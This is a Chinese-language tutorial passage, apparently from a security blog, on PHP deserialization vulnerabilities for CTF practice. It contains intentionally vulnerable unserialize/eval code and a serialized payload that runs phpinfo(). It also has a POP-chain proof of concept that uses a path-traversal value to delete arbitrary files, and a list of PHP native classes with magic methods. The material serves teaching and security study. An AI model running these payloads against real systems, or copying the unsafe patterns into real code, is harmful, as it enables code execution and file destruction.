<p>protected表示受保护的，只有本类或子类或父类中可以访问；</p>
<h4 id="~反序列化"><a class="markdownIt-Anchor" href="#~反序列化"></a> ~反序列化</h4>
<h5 id="json_encode"><a class="markdownIt-Anchor" href="#json_encode"></a> json_encode()</h5>
<blockquote>
<p>PHP json_encode() 用于对变量进行 JSON 编码，该函数如果执行成功返回 JSON 数据，否则返回 FALSE 。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$value</span>[,<span class="variable">$options</span> = <span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<h6 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> 参数：</h6>
<ul>
<li>
<p><strong>value</strong>: 要编码的值。该函数只对 UTF-8 编码的数据有效。</p>
</li>
<li>
<p><strong>options</strong>:由以下常量组成的二进制掩码 JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERROR。</p>
<p>要注意的是 JSON_UNESCAPED_UNICODE 选项，如果我们不希望中文被编码，可以添加该选项。</p>
</li>
</ul>
<h5 id="serialize"><a class="markdownIt-Anchor" href="#serialize"></a> serialize()</h5>
<blockquote>
<p><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串。</p>
<p><strong>serialize()</strong> 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">serialize</span>(mixer <span class="variable">$value</span>)</span><br></pre></td></tr></table></figure>
<h6 id="参数value要序列化的对象或数组"><a class="markdownIt-Anchor" href="#参数value要序列化的对象或数组"></a> 参数：$value:要序列化的对象或数组。</h6>
<h5 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize"></a> unserialize()</h5>
<blockquote>
<p><strong>unserialize()</strong> 函数用于将通过 <a href="https://www.runoob.com/php/php-serialize-function.html">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</p>
<p>PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">unserialize</span>(<span class="keyword">string</span> <span class="variable">$str</span>)</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<p>$str:序列化后的字符串。</p>
<h5 id="演示"><a class="markdownIt-Anchor" href="#演示"></a> 演示：</h5>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221006202111066.png" alt="image-20221006202111066"></p>
<h3 id="二-反序列化漏洞"><a class="markdownIt-Anchor" href="#二-反序列化漏洞"></a> 二、反序列化漏洞</h3>
<p>为啥会产生这个漏洞呢？</p>
<p>首先，我们先来了解一下什么是魔术方法！</p>
<h4 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h4>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__invoke</span>()当尝试以调用函数的方式调用一个对象时，<span class="built_in">__invoke</span>() 方法会被自动调用。</span><br><span class="line"></span><br><span class="line"><span class="built_in">__sleep</span>() 在对象在被序列化<span class="built_in">unserialize</span>()之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化<span class="built_in">serialize</span>()之后立即被调用</span><br><span class="line"></span><br><span class="line">__call 在对象中调用一个不可访问方法时调用。(必须满足两个参数)</span><br><span class="line"></span><br><span class="line">__get 获得一个类的成员变量时调用;在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值</span><br><span class="line"></span><br><span class="line"><span class="built_in">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line"><span class="built_in">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line"><span class="built_in">__isset</span>() 在不可访问的属性上调用<span class="built_in">isset</span>()或<span class="built_in">empty</span>()触发</span><br><span class="line"></span><br><span class="line"><span class="built_in">__unset</span>() 在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br></pre></td></tr></table></figure>
<h5 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$f1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;(s)(e)(r)(i)(a)(l)(i)(z)(e)(!)&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_unserialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&quot;size&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size-<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString tigger&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is __invoke&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_serialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hource</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png" alt="test"></p>
<p>这里就算给出了Demo，同样不好理解怎么就是反序列化漏洞了？</p>
<h5 id="demo01-__wokeup"><a class="markdownIt-Anchor" href="#demo01-__wokeup"></a> Demo01-__wokeup()</h5>
<p>这里我们来用__wokeup()来做一个漏洞演示：</p>
<p>首先来看一下反序列化实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&quot;SCR&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018214636570-16672739578743.png" alt="image-20221018214636570"></p>
<p>接下来就是漏洞实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;TWe1v3&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码审计：</p>
<p>01.可控参数是GET型string参数</p>
<p>02.后端接收参数后进行反序列化操作</p>
<p>03.test类中存在__wakeup魔术方法，操作是eval($id)</p>
<p>构建POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011016911-16672739578732.png" alt="image-20221019011016911"></p>
<p>直接使用链子：O:4:“test”:1:{s:1:“a”;s:10:“phpinfo();”;}</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221019011242914-16672739578744.png" alt="image-20221019011242914"></p>
<p>到此，反序列化的产生原因我不言而喻了吧！</p>
<h2 id="php反序列化常见考点"><a class="markdownIt-Anchor" href="#php反序列化常见考点"></a> php反序列化常见考点</h2>
<h3 id="pop链"><a class="markdownIt-Anchor" href="#pop链"></a> POP链</h3>
<p>通过用户可控的反序列化操作，其中可触发的魔术方法为出发点，在魔术方法中的函数在其他类中存在同名函数，或通过传递，关联等可以调用的其他执行敏感操作的函数，然后传递参数执行敏感操作，即</p>
<p><mark>用户可控反序列化→魔术方法→魔术方法中调用的其他函数→同名函数或通过传递可调用的函数→敏感操作</mark></p>
<h4 id="实例复现"><a class="markdownIt-Anchor" href="#实例复现"></a> 实例复现</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$user_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$user_data</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="审计源码"><a class="markdownIt-Anchor" href="#审计源码"></a> 审计源码：</h5>
<p>首先我们看最限制行的操作在最下面反序列化GET到的参数data，然后执行echo (user_data，这里如果)user_data是一个类实例化来的对象的话，就会触发对象中的__tostring()魔术方法</p>
<p>接着来单独分析每个类中的函数关系:</p>
<p>Test1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test3</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj)) <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">Delete</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 首先声明了$obj变量</p>
<p>.2 类中有______construct()和__tostring()魔术方法，__construct()方法为(obj变量赋值为Test3类的实例化对象，__tostring()方法判断如果)obj变量存在则返回调用$obj对象中的Delete()函数</p>
<p>Test2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = “/<span class="keyword">var</span>/www/html/cache/tmp/&#123;<span class="variable language_">$this</span>-&gt;cache_file&#125;”; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a evil Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1首先声明了$cache_file变量</p>
<p>.2 定义了Delete()函数，如果定义的$file变量中的文件存在，则删除此文件并返回提示内容</p>
<p>Test3：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;I am a safe Delete function&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>.1 定义了Delete()函数，次函数只返回一句话，没有敏感操作，为安全函数</p>
<h5 id="pop链构造"><a class="markdownIt-Anchor" href="#pop链构造"></a> <em>POP链构造</em></h5>
<p>首先出发点是Test1中的______tostring()魔术方法，其中调用了(this-&gt;obj中的Delete()函数，而)this-&gt;obj是在实例化对象是触发______construct方法，将<span class="katex-error" title="ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 80: …的执行流如下 `Test1类→_̲_construct()→">this-&gt;obj作为实例化Test3类的对象，那么此时调用的就是Test3类中的Delete()函数，只返回一句提示，那么此时的执行流如下 `Test1类→__construct()→</span>this-&gt;obj=new Test3→__tostring()→Test3.Delete<code>方法 不过在Test2类中也定义了和Test3中同名的函数Delete()，那么我们可以通过构造特定的反序列化参数来修改执行流，也就是构造我们的POP链，在反序列化后使用Test2类中的Delete()来执行敏感操作，让执行流如下 </code>Test1类→__construct()→$this-&gt;obj=new Test2→__tostring()→Test2.Delete方法` 那么POP链的构造就是通过反序列化和echo来触发__tostring()魔术方法，并且此方法中调用Test2中的Delete()方法，造成任意文件删除的危害。</p>
<h5 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> POC</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache_file</span> = <span class="string">&#x27;../../../../test.php&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$evil</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="php原生类总结"><a class="markdownIt-Anchor" href="#php原生类总结"></a> PHP原生类总结</h3>
<p>其实，在CTF题目中，可以利用php原生类来进行XSS,反序列化，SSRF，XXE和读文件的思路</p>
<p>通过遍历看一下php的内置类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;    </span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;    </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;__set_state&#x27;</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Generator</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DomainException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">InvalidArgumentException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LengthException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfRangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RuntimeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OutOfBoundsException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">OverflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">RangeException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnderflowException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnexpectedValueException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveCachingIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileInfo</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FilesystemIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">RecursiveDirectoryIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span 